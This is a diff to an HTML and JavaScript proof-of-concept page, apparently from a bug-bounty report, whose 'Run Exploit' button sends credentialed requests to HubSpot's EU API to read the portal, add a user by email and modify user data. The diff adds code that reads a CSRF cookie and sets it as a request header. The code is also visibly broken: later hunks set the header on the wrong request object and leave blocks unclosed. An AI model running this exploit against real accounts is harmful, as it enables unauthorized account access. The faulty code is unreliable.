@@ -6,6 +6,12 @@
 <button onclick="runExploit()">Run Exploit</button>
 <pre id="log"></pre>
 <script>
+// Extract 'csrf' cookie value
+const csrfToken = document.cookie
+  .split('; ')
+  .find(row => row.startsWith('hubspotapi-csrf='))
+  ?.split('=')[1];
+
 function log(msg) {
   document.getElementById("log").textContent += msg + "\n";
 }
@@ -28,6 +34,11 @@ function runExploit() {
   xhr1.open("GET", "https://api-eu1.hubspot.com/home/v2/api/portal", true);
   xhr1.withCredentials = true;
   xhr1.setRequestHeader("Content-Type", "application/json");
+  
+  // ✅ Add CSRF header here
+  if (csrfToken) {
+    xhr1.setRequestHeader("X-Hubspot-Csrf-Hubspotapi", csrfToken);
+}
 
   xhr1.onreadystatechange = function () {
     if (xhr1.readyState === XMLHttpRequest.DONE) {
@@ -55,6 +66,9 @@ function runExploit() {
       xhr2.open("POST", postUrl, true);
       xhr2.withCredentials = true;
       xhr2.setRequestHeader("Content-Type", "application/json");
+
+      if (csrfToken) {
+        xhr1.setRequestHeader("X-Hubspot-Csrf-Hubspotapi", csrfToken);
 
       const userData = {
         "users": [{ "email": "dangerhm+3@wearehackerone.com" }],
@@ -107,6 +121,9 @@ function runExploit() {
           xhr3.open("PUT", putUrl, true);
           xhr3.withCredentials = true;
           xhr3.setRequestHeader("Content-Type", "application/json");
+
+          if (csrfToken) {
+            xhr1.setRequestHeader("X-Hubspot-Csrf-Hubspotapi", csrfToken);
 
           const putData = [{
             "userId": userId,
